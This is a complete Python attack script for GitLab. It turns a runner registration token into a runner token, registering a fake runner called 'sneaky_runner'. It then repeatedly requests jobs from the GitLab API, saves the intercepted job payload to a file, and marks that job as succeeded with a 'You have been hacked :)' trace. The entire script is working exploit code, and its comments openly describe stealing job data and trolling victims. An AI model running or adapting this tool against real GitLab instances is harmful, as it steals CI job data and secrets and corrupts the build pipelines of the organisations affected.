#!/usr/bin/env python3

import sys, argparse, requests, json

parser = argparse.ArgumentParser(description="Abuse GitLab Runners")
parser.add_argument('--target', dest='target', help="The GitLab instance to target")
parser.add_argument('--register', dest='register', help="Register a token")
parser.add_argument('--attack', dest='attack', help="Use Runner token to steal data")
args = parser.parse_args()


""" This function will take a registration token and convert it into a runner token.
    That second token can then be used to steal job data"""
def register_runner(registration_token, gitlab_target):
    # If you need a tag, add "tag_list": "blah,blaw"
    REGISTRATION_JSON = '{"info":{"name":"gitlab-runner","version":"10.5.0","revision":"10.5.0","platform":"linux","architecture":"amd64","features":{"variables":false,"image":false,"services":false,"features":false,"cache":false,"shared":false}},"token":"%s","description":"sneaky_runner","run_untagged":true,"locked":true}' % registration_token
    headers = { "Content-Type": "application/json" }

    response = requests.post(
            gitlab_target + "/api/v4/runners", 
            data=REGISTRATION_JSON, 
            headers=headers,
            verify=False
    )

    token = json.loads(response.text)
    print("Token:", token['token'])


def attack_runner(runner_token, gitlab_target):
    RUNNER_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","last_update":"bc5514b213c064c154d14a6008513cc0"}' % runner_token
    headers = { "Content-Type": "application/json" }

    print("Going to start spamming. Gotta go fast...")
    finished = False
    sess = requests.Session()
    while not finished:
        response = sess.post(
            gitlab_target + "/api/v4/jobs/request",
            data=RUNNER_JSON,
            headers=headers,
            verify=False
        )

        if response.status_code == 201:
            with open('grabbed_data.json','w') as w:
                w.write(response.text)
            print(response.text)

            ## Let's troll a little bit :)
            data = json.loads(response.text)
            id_num = data['id']
            resp_token = data['token']
            print("Stolen ID:", id_num)
            TROLL_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","state":"success","trace":"\\u001b[0KYou have been hacked :)\\n\\u001b[0;m"}' % resp_token
            resp = sess.put(gitlab_target + "/api/v4/jobs/" + str(id_num), data=TROLL_JSON, headers=headers, verify=False)
            print("Response code:", resp.status_code)

            exit()


# Figure out what we are doing
if args.register:
    register_runner(args.register, args.target)
if args.attack:
    attack_runner(args.attack, args.target)
